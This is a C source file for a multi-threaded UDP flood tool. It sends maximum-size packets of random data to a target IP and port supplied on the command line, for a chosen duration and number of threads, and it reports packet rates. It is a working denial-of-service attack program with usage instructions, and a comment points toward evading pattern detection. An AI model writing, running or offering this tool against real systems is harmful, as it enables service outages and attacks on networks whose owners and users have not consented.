#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <errno.h>

#define BUFFER_SIZE 65507
#define MAX_THREADS 100

typedef struct {
    char ip[16];
    int port;
    int duration;
    int thread_id;
} flood_args_t;

volatile sig_atomic_t keep_running = 1;

void handle_signal(int sig) {
    keep_running = 0;
}

void *udp_flood(void *args) {
    flood_args_t *flood_args = (flood_args_t *)args;
    const char *ip = flood_args->ip;
    int port = flood_args->port;
    int duration = flood_args->duration;
    int thread_id = flood_args->thread_id;
    
    int sock;
    struct sockaddr_in target;
    char *buffer;
    socklen_t target_len = sizeof(target);

    // Create socket with high performance options
    sock = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock < 0) {
        perror("Socket creation failed");
        pthread_exit(NULL);
    }

    // Set socket options for high performance
    int sock_opt = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &sock_opt, sizeof(sock_opt));
    
    // Increase send buffer size
    int sendbuf = 1024 * 1024; // 1MB buffer
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &sendbuf, sizeof(sendbuf));

    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    if (inet_pton(AF_INET, ip, &target.sin_addr) <= 0) {
        perror("Invalid address/Address not supported");
        close(sock);
        pthread_exit(NULL);
    }

    // Allocate buffer and fill with random data to avoid compression/caching
    buffer = malloc(BUFFER_SIZE);
    if (!buffer) {
        perror("Buffer allocation failed");
        close(sock);
        pthread_exit(NULL);
    }
    
    // Fill buffer with pseudo-random data
    srand(time(NULL) + thread_id);
    for (int i = 0; i < BUFFER_SIZE; i++) {
        buffer[i] = (char)(rand() % 256);
    }

    int time_elapsed = 0;
    time_t start_time = time(NULL);
    long packet_count = 0;
    long total_bytes = 0;
    time_t last_stats_time = start_time;
    
    printf("Thread %d: Starting UDP flood on %s:%d for %d seconds\n", 
           thread_id, ip, port, duration);
    
    while (keep_running && time_elapsed < duration) {
        ssize_t sent = sendto(sock, buffer, BUFFER_SIZE, 0, 
                             (struct sockaddr *)&target, target_len);
        
        if (sent < 0) {
            if (errno == EAGAIN || errno == EWOULDBLOCK || errno == ENOBUFS) {
                // Buffer full, small delay and continue
                usleep(1000);
                continue;
            }
            perror("Sendto failed");
            break;
        }
        
        packet_count++;
        total_bytes += sent;
        
        time_elapsed = (int)(time(NULL) - start_time);
        
        // Print stats every 3 seconds
        time_t current_time = time(NULL);
        if (current_time - last_stats_time >= 3) {
            double mbps = (total_bytes * 8.0) / (1024 * 1024 * (current_time - last_stats_time));
            printf("Thread %d: %d/%ds | Packets: %ld | Rate: %.2f Mbps\n", 
                   thread_id, time_elapsed, duration, packet_count, mbps);
            last_stats_time = current_time;
            total_bytes = 0;
        }
        
        // Small random delay to avoid pattern detection (optional)
        // usleep(rand() % 100);
    }

    printf("Thread %d: Flood completed. Total packets: %ld\n", thread_id, packet_count);
    close(sock);
    free(buffer);
    free(args);
    pthread_exit(NULL);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        printf("Usage: %s <IP> <PORT> <DURATION> <THREADS>\n", argv[0]);
        printf("Example: %s 192.168.1.1 80 60 10\n", argv[0]);  // FIXED LINE
        exit(EXIT_FAILURE);
    }

    // Setup signal handling for graceful shutdown
    signal(SIGINT, handle_signal);
    signal(SIGTERM, handle_signal);

    const char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    int num_threads = atoi(argv[4]);

    if (num_threads > MAX_THREADS) {
        printf("Warning: Limiting threads to %d\n", MAX_THREADS);
        num_threads = MAX_THREADS;
    }

    printf("Starting multi-threaded UDP flood with %d threads...\n", num_threads);
    printf("Target: %s:%d for %d seconds\n", ip, port, duration);
    printf("Press Ctrl+C to stop early\n\n");

    pthread_t threads[MAX_THREADS];
    
    // Create multiple threads
    for (int i = 0; i < num_threads; i++) {
        flood_args_t *args = malloc(sizeof(flood_args_t));
        if (!args) {
            perror("Memory allocation failed");
            continue;
        }
        
        strncpy(args->ip, ip, sizeof(args->ip) - 1);
        args->ip[sizeof(args->ip) - 1] = '\0';
        args->port = port;
        args->duration = duration;
        args->thread_id = i + 1;

        if (pthread_create(&threads[i], NULL, udp_flood, (void *)args) != 0) {
            perror("Could not create thread");
            free(args);
        } else {
            printf("Started thread %d\n", i + 1);
        }
        
        // Stagger thread creation to avoid synchronization
        usleep(10000);
    }

    // Wait for all threads to complete
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\nAll threads completed. UDP flood finished.\n");
    return 0;
}
